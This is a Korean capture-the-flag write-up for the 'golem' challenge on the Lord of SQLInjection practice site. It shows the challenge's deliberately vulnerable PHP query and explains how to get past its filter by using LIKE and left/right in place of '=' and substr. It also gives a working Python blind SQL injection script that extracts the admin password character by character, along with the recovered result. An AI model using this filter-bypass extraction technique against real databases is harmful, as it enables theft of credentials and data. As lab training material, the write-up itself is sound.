# LOS - golem

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

이번 문제는 다양한 조건이 걸려있다. 'or','and'부터 pw를 비교하는데 쓰는 substr에 '=' 기호까지..  그래서 이번 문제는 새로운 비교 구문을 찾아내야 했다.

열심히 찾아낸 결과, '='을 대체할 like라는 구문과 substr을 대체할 left,right 구문을 알아냈다. 
먼저 찾은 구문에 대해서 알아보면,

like는 말 그대로 '='의 기능을 하는 구문이고

```mysql
select * from table_name where id like 'admin'
```

이런 식으로 사용한다. 'admin'부분에 패턴을 주어서 다양하게 활용이 가능하다. 

left와 right구문은 주어진 부분의 왼쪽으로부터 위치, 오른쪽으로부터 위치의 값을 가져오며

```mysql
select * from table_name where ascii(left(right(pw,1),1)) = 49
```

이처럼 사용이 가능하다. 

두 구문 모두 활용하기에 따라서 활용법은 많으나 문제에 관련해서만 정리했다. 



이제 문제를 보면 지금까지 만들어서 사용했던 코드에서 '='와 'substr'부분을 위의 구문으로 고쳐서 사용하면 pw를 알아낼 수 있다. 

```python
import requests
cooki = {'PHPSESSID': "70n919pvoci31ggq3bqa5i3mp0"}
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'pw': "'||length(pw) like '"+str(i)+"'#"}
    res = requests.get(url, params, cookies=cooki)
    #print res.text
    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'pw': "' || id like 'admin' && ascii(left(right(pw,"+str(j)+"),1)) like "+str(k)+"#"}
        res2 = requests.get(url, params, cookies=cooki)

        if key in res2.text:
            print str(j) + " : " + chr(k)

```

먼저 pw의 길이를 구하고 구한 길이만큼 반복문을 돌려서 pw의 각 문자를 비교한다. 

```
1 : b
2 : 0
3 : 9
4 : 2
5 : 6
6 : d
7 : 7
8 : 7
```

비교해서 얻은 문자열은 위와 같은데 비교할때 pw의 뒤에서부터 비교하는 방식으로 코드를 짰으므로 '77d6290b'가 admin의 pw이다. 

```url
https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=77d6290b
```

![1565342059438](C:\Users\qkrwl\Documents\web\los\LOS - golem-clear.png)